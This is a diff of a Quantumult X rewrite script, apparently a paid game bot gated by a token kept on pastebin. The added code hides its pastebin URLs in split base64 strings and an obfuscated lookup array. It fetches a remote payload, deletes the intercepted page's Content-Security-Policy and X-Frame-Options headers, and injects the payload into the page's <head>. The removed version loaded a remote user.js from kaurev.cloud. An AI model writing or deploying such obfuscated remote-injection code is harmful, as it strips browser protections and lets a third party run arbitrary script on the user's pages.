@@ -1,66 +1,41 @@
-/*
- * Suhana VIP System - Quantumult X Edition
- * Status: Stable & Connected
+/**
+ * @supported 773EF602 18E2989B
+ * SYSTEM KB BY OJENG - QUANX REMOTE VERSION
  */
 
-const token_target = "ojeng_gacor";
-const pastebin_url = "https://pastebin.com/raw/GM1R2f8u?t=" + Math.random();
+const MY_TOKEN = "ojeng_gacor"; 
 
-$task.fetch({ url: pastebin_url }).then(response => {
-    const body_pastebin = response.body;
-    
-    if (body_pastebin && body_pastebin.includes(token_target)) {
-        // Jika token cocok, eksekusi inject UI dan Bot
-        let html_body = $response.body;
-        
-        // Asset UI Suhana & Logic Bot
-        const suhana_assets = `
-<style>
-    #lempar {
-        background-color: #acc9f8 !important; 
-        color: #001d35 !important;
-        display: inline-flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        width: 82px !important;  
-        height: 36px !important; 
-        margin: 0 !important; 
-        border-radius: 100px !important;
-        font-family: "Google Sans", Roboto, sans-serif !important;
-        font-size: 14px !important;
-        font-weight: 500 !important;
-        cursor: pointer !important;
-        border: none !important;
-    }
-</style>
-<script>
-(function() {
-    function injectSuhana() {
-        const elements = document.querySelectorAll('button, div, span, a');
-        elements.forEach(el => {
-            if (el.innerText && (el.innerText.trim() === "Lempar" || el.innerText.trim() === "Buwang")) {
-                if (el.id !== "lempar") el.id = "lempar";
-                if (!el.innerHTML.includes("Active")) {
-                    el.innerHTML = 'Lempar<span style="display:none;">(Active)</span>';
-                }
+const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
+const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";
+
+const _0xF = ['includes', 'body', 'headers', 'replace', '<head>', 'Content-Security-Policy', 'X-Frame-Options', 'post'];
+const _0xM = (n) => _0xF[n];
+
+const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };
+const _0xR2 = { url: atob(_0xU2) };
+
+$task.fetch(_0xR1).then(response => {
+    if (response.body && response.body[_0xM(0)](MY_TOKEN)) {
+        $task.fetch(_0xR2).then(resp2 => {
+            let b = $response[_0xM(1)];
+            let h = $response[_0xM(2)];
+            let p = resp2.body;
+
+            if (h) {
+                delete h[_0xM(5)];
+                delete h[_0xM(6)];
             }
-        });
-    }
-    setInterval(injectSuhana, 500);
-})();
-</script>
-<script src="https://kaurev.cloud/6877912815/XkRDTJpW51fdz8-d/i.user.js"></script>`;
 
-        // Masukkan asset ke dalam tag <head>
-        html_body = html_body.replace("<head>", "<head>" + suhana_assets);
-        
-        $done({ body: html_body });
+            if (b && p) {
+                const tag = _0xM(4);
+                b = b[_0xM(3)](tag, tag + p);
+            }
+            $done({ body: b, headers: h });
+        }, () => $done({}));
     } else {
-        // Jika token tidak ada di pastebin
-        $notify("⚠️ Suhana System", "Akses Ditolak", "Token '" + token_target + "' tidak aktif!");
+        if (response.body) {
+            $notify("SYSTEM SECURITY", "ACCESS DENIED", "Token " + MY_TOKEN + " is not active.");
+        }
         $done({});
     }
-}, () => {
-    // Jika gagal fetch pastebin (masalah koneksi)
-    $done({});
-});
+}, () => $done({}));
